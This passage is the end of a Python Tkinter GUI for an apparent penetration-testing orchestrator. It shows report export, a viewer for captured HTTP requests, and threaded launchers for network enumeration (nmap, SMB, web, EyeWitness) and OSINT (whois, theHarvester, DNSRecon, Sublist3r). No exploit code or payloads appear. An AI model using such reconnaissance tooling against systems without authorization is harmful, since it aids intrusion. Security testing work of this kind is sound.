            initialfile="final_attack_path_report.txt"
        )

        if save_path:
            try:
                import shutil
                shutil.copy2(report_file, save_path)
                messagebox.showinfo("Success", f"Report exported to {save_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export report: {e}")
    def _view_captured_requests(self):
        """Show captured HTTP request files."""
        import os
        request_dir = self.orchestrator.results_dir / "requests"

        if request_dir.exists():
            files = list(request_dir.glob("*.txt"))
            if files:
                # Show file list in new window
                self._show_request_files_window(files)
            else:
                messagebox.showinfo("No Requests", "No HTTP request files captured yet.\nRun a scan first!")
        else:
            messagebox.showinfo("No Requests", "No HTTP request files captured yet.\nRun a scan first!")

    def _show_request_files_window(self, files):
        """Show a window with the list of captured request files."""
        window = tk.Toplevel(self.root)
        window.title("Captured HTTP Request Files")
        window.geometry("600x400")

        # Create text widget
        text = scrolledtext.ScrolledText(window, wrap=tk.WORD)
        text.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

        # Add file list
        text.insert(tk.END, f"Found {len(files)} captured HTTP request files:\n\n")
        for i, file in enumerate(sorted(files), 1):
            text.insert(tk.END, f"{i}. {file.name}\n")
            text.insert(tk.END, f"   Path: {file}\n")
            try:
                # Show first few lines of the request
                with open(file, "r") as f:
                    lines = f.readlines()[:5]  # First 5 lines
                    for line in lines:
                        text.insert(tk.END, f"   {line.rstrip()}\n")
            except:
                text.insert(tk.END, "   [Could not read file]\n")
            text.insert(tk.END, "\n")

        # Make text read-only
        text.config(state=tk.DISABLED)

        # Add close button
        ttk.Button(window, text="Close", command=window.destroy).pack(pady=5)

    # =========================================================================
    # PENTEST AUTOMATION INTEGRATION METHODS
    # =========================================================================

    def _browse_auto_output(self):
        """Browse for automated enumeration output directory"""
        directory = filedialog.askdirectory()
        if directory:
            self.auto_output_entry.delete(0, tk.END)
            self.auto_output_entry.insert(0, directory)

    def _browse_osint_output(self):
        """Browse for OSINT output directory"""
        directory = filedialog.askdirectory()
        if directory:
            self.osint_output_entry.delete(0, tk.END)
            self.osint_output_entry.insert(0, directory)

    def _auto_log(self, message):
        """Log message to automated enumeration console"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.auto_output_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.auto_output_text.see(tk.END)
        self.status_bar.config(text=message[:100])

    def _osint_log(self, message):
        """Log message to OSINT console"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.osint_output_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.osint_output_text.see(tk.END)
        self.status_bar.config(text=message[:100])

    def _start_auto_enum(self):
        """Start automated enumeration scan"""
        target = self.auto_target_entry.get().strip()
        output_dir = self.auto_output_entry.get().strip()

        if not target:
            messagebox.showerror("Error", "Please enter a target IP or range")
            return

        if not output_dir:
            messagebox.showerror("Error", "Please select an output directory")
            return

        # Get port scan type
        port_scan_type = self.port_scan_type.get()

        # Create enumerator with port scan type
        self.auto_enumerator = AutomatedEnumerator(target, output_dir, port_scan_type)

        # Update UI
        self.auto_scan_button.config(state=tk.DISABLED)
        self.auto_stop_button.config(state=tk.NORMAL)
        self.auto_progress.start()

        self.auto_output_text.delete('1.0', tk.END)
        self._auto_log(f"Starting automated enumeration of {target}")
        self._auto_log(f"Port scan mode: {'All 65535 ports' if port_scan_type == 'allports' else 'Top 1000 ports'}")
        self._auto_log(f"Output directory: {self.auto_enumerator.folders['base']}")
        self._auto_log("=" * 60)

        # Run scan in separate thread
        scan_thread = threading.Thread(target=self._run_auto_enum_thread, daemon=True)
        scan_thread.start()

    def _run_auto_enum_thread(self):
        """Run automated enumeration in background thread"""
        try:
            # Phase 1: Nmap Discovery
            if self.auto_tool_vars['nmap_discovery'].get():
                self._auto_log("\n>>> Phase 1: Nmap Discovery")
                self.auto_enumerator.run_nmap_discovery(callback=self._auto_log)

            # Phase 2: Web Enumeration
            if self.auto_tool_vars['web_enum'].get():
                self._auto_log("\n>>> Phase 2: Web Enumeration")
                self.auto_enumerator.run_web_enumeration(callback=self._auto_log)

            # Phase 3: SMB Enumeration
            if self.auto_tool_vars['smb_enum'].get():
                self._auto_log("\n>>> Phase 3: SMB Enumeration")
                self.auto_enumerator.run_smb_enumeration(callback=self._auto_log)

            # Phase 4: Visual Reconnaissance
            if self.auto_tool_vars['eyewitness'].get():
                self._auto_log("\n>>> Phase 4: Visual Reconnaissance")
                self.auto_enumerator.run_eyewitness(callback=self._auto_log)

            # Generate summary
            self.auto_enumerator._generate_summary_report()

            self._auto_log("\n" + "=" * 60)
            self._auto_log("✓ Enumeration completed successfully!")
            self._auto_log(f"Results saved to: {self.auto_enumerator.folders['base']}")

            # Store results
            self.pentest_results['auto_enum'] = {
                'target': self.auto_enumerator.target,
                'output_dir': str(self.auto_enumerator.folders['base']),
                'open_ports': self.auto_enumerator.open_ports if hasattr(self.auto_enumerator, 'open_ports') else {},
                'results': self.auto_enumerator.results
            }

            # Show completion message
            self.root.after(0, lambda: messagebox.showinfo(
                "Success",
                f"Enumeration completed!\n\nResults saved to:\n{self.auto_enumerator.folders['base']}"
            ))

        except Exception as e:
            self._auto_log(f"\n✗ Error during enumeration: {str(e)}")
            self.root.after(0, lambda: messagebox.showerror("Error", f"Enumeration failed:\n{str(e)}"))

        finally:
            # Re-enable buttons
            self.root.after(0, lambda: self.auto_scan_button.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.auto_stop_button.config(state=tk.DISABLED))
            self.root.after(0, lambda: self.auto_progress.stop())

    def _stop_auto_enum(self):
        """Stop automated enumeration"""
        self._auto_log("\nStopping automated enumeration...")
        self.auto_scan_button.config(state=tk.NORMAL)
        self.auto_stop_button.config(state=tk.DISABLED)
        self.auto_progress.stop()

    def _start_osint(self):
        """Start external OSINT enumeration"""
        domain = self.osint_domain_entry.get().strip()
        output_dir = self.osint_output_entry.get().strip()

        if not domain:
            messagebox.showerror("Error", "Please enter a target domain")
            return

        if not output_dir:
            messagebox.showerror("Error", "Please select an output directory")
            return

        # Create enumerator
        self.external_enumerator = ExternalEnumerator(domain, output_dir)

        # Update UI
        self.osint_scan_button.config(state=tk.DISABLED)
        self.osint_stop_button.config(state=tk.NORMAL)
        self.osint_progress.start()

        self.osint_output_text.delete('1.0', tk.END)
        self._osint_log(f"Starting external OSINT for {domain}")
        self._osint_log(f"Output directory: {self.external_enumerator.folder}")
        self._osint_log("=" * 60)

        # Run scan in separate thread
        scan_thread = threading.Thread(target=self._run_osint_thread, daemon=True)
        scan_thread.start()

    def _run_osint_thread(self):
        """Run OSINT enumeration in background thread"""
        try:
            # Run selected tools
            if self.osint_tool_vars['whois'].get():
                self._osint_log("\n>>> Running WHOIS lookup")
                self.external_enumerator.run_whois(callback=self._osint_log)

            if self.osint_tool_vars['theharvester'].get():
                self._osint_log("\n>>> Running theHarvester")
                self.external_enumerator.run_theharvester(callback=self._osint_log)

            if self.osint_tool_vars['dnsrecon'].get():
                self._osint_log("\n>>> Running DNSRecon")
                self.external_enumerator.run_dnsrecon(callback=self._osint_log)

            if self.osint_tool_vars['sublist3r'].get():
                self._osint_log("\n>>> Running Sublist3r")
                self.external_enumerator.run_sublist3r(callback=self._osint_log)

            # Generate summary
            self.external_enumerator._generate_combined_report()

            self._osint_log("\n" + "=" * 60)
            self._osint_log("✓ OSINT enumeration completed!")
            self._osint_log(f"Results saved to: {self.external_enumerator.folder}")

            # Store results
            self.pentest_results['osint'] = {
                'domain': self.external_enumerator.domain,
                'output_dir': str(self.external_enumerator.folder),
                'results': self.external_enumerator.results
            }

            # Show completion message
            self.root.after(0, lambda: messagebox.showinfo(
                "Success",
                f"OSINT enumeration completed!\n\nResults saved to:\n{self.external_enumerator.folder}"
            ))

        except Exception as e:
            self._osint_log(f"\n✗ Error during OSINT: {str(e)}")
            self.root.after(0, lambda: messagebox.showerror("Error", f"OSINT failed:\n{str(e)}"))

        finally:
            # Re-enable buttons
            self.root.after(0, lambda: self.osint_scan_button.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.osint_stop_button.config(state=tk.DISABLED))
            self.root.after(0, lambda: self.osint_progress.stop())

    def _stop_osint(self):
        """Stop OSINT enumeration"""
        self._osint_log("\nStopping OSINT enumeration...")
        self.osint_scan_button.config(state=tk.NORMAL)
        self.osint_stop_button.config(state=tk.DISABLED)
        self.osint_progress.stop()

    def _process_pentest_queue(self):
        """Process messages from pentest automation threads"""
        try:
            while True:
                msg_type, msg_data = self.pentest_queue.get_nowait()

                if msg_type == 'log':
                    # Log to appropriate console
                    pass
                elif msg_type == 'complete':
                    self.status_bar.config(text=f"Scan complete! Results: {msg_data}")
                elif msg_type == 'error':
                    self.status_bar.config(text=f"Error: {msg_data}")
        except queue.Empty:
            pass

        # Schedule next check
        self.root.after(100, self._process_pentest_queue)

# =============================================================================
# MAIN APPLICATION
# =============================================================================

# =============================================================================
# MAIN APPLICATION
# =============================================================================

def main():
    """Main application entry point."""
    root = tk.Tk()
    app = SecurityOrchestratorGUI(root)

    # Set window icon if available
    try:
        root.iconbitmap()  # Use default
    except:
        pass

    root.mainloop()

if __name__ == "__main__":
    main()
